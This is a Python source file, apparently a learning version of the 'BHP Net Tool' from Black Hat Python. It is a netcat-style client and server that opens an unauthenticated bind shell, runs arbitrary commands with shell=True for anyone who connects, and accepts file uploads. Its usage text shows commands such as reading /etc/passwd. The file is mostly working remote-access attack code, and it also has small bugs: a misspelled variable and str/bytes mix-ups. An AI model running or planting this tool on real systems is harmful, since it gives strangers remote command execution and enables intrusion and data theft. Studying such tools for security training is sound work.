#!/usr/bin/env python3

import sys
import socket
import getopt
import threading
import subprocess

#global variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

def usage():
    print("BHP Net Tool")
    print()
    print("Usage: BHPnet.py -t target_host -p port")
    print("-l --listen                 - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run    - execute [file_to_run upon] receiving connection")
    print("-c --command                - initialize a command shell")
    print("-u --upload=destination     - upon receiving connection upload a file and wrtie to [destination]")
    print()
    print()
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    print()
    sys.exit(0)

def client_sender(buff):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        #connect to our target host
        client.connect((target, port))
        
        if len(buff):
            client.send(buff.encode())

            while True:
                #wait for data back
                recv_len = 1
                response = ""
                
                while recv_len:
                    data = client.recv(4096)
                    recv_len = len(data)
                    response += data.decode('utf-8')
                    if recv_len < 4096:
                        break
                if response == "<BHP:#> ":
                    print(response, end='')
                else:
                    print('\n', response)
                    print('\n', "<BHP:#>", end='')
                    client.send('\n'.encode())
                
                #wait for more input messages
                buff = input("")
                buff += "\n"

                #send it off
                client.send(buff.encode())
        else:
            print('no buffer...')
            client.send("\n".encode())

    except Exception as e:
        print('[*] Exiting! Exception raised!\n', e)
        #tear down the connection
        client.close()

def server_loop():
    global target

    #if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)
    
    if listen:
        print('Listening on %s:%d' % (target, port)) #debug
    elif upload:
        print('Preparing to upload over %s:%d' % (target, port)) #debug

    while True:
        client_socket, addr = server.accept()

        #spin off a thread to handle out new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def run_command(command):
    #print('running command')
    #trim the newline
    command = command.rstrip()

    #run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = "Failed to execute command.\r\n"
        output += str(e)
    
    #send the output back to the client
    return output

def client_handler(client_socket):
    #global upload, execute, command

    #check for upload
    if upload:
        print('Ready to upload to:', upload_destination)
        #read in all of the bytes and write to our destination
        file_buffer = ""

        #keep reading data until none is available
        while True:
            data = client_socket.recv(1024).decode('utf-8')
            print(data)
            if not data:
                break
            else:
                file_buffer += data

        #now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_desitination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            #acknowledge that we wrote the file out
            ack_str = "Successfully saved file to %s\r\n" % upload_destination
            client_socket.send(ack_str.encode())   #encode this string
        except:
            ack_str = "Failed to save file to %s\r\n" % upload_destination
            client_socket.send(ack_str.encode())

    #check for command execution
    if len(execute):
        #run the command
        output = run_command(execute)

        client_socket.send(output)

    #now we go into another loop if a command shell was requested
    if command:
        #show simple prompt
        client_socket.send("<BHP:#> ".encode())
        while True:
            
            #receive until we see a linefeed
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode("utf-8")
            
            #send back the command output
            if len(cmd_buffer):
                response = run_command(cmd_buffer)
                #send back the response
                if isinstance(response, bytes):
                    client_socket.send(response)
                else:
                    client_socket.send(response.encode())
            else:
                client_socket.send("<BHP:#> ".encode())

            """
            #send back the response
            if isinstance(response, bytes):
                client_socket.send(response)
            else:
                client_socket.send(response.encode())

            #show simple prompt
            #client_socket.send("<BHP:#> ".encode())
            """

def main():
    global listen, command, execute, target, upload, upload_destination, port
    
    if not len(sys.argv[1:]):
        usage()

    #read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
        #returns opts=(option, value) pairs, with value being an empty string if none provided
        #returns args as program arguments ofter the options have been stripped
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        #o is either short or long option as follows, a is its value if provided
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            #should test for a not being empty string
            upload_destination = a
            upload = True
        elif o in ("-t", "--target"):
            #should test for a not being empty string and maybe proper target (e.g. valid ip or domain)
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    #are we going to listen or just send data from stdin
    if not listen and not upload and len(target) and port > 0:
        #read in buffer from the commandline
        #this will block, so send CTRL-D if not sending input to stdin
        buff = sys.stdin.read()

        #send data
        client_sender(buff)
        
    #we are going to listen and potentially upload things,
    #execute commands, and drop a shell back depending on options entered
    if listen or upload:
        server_loop()

if __name__=="__main__":
    main()












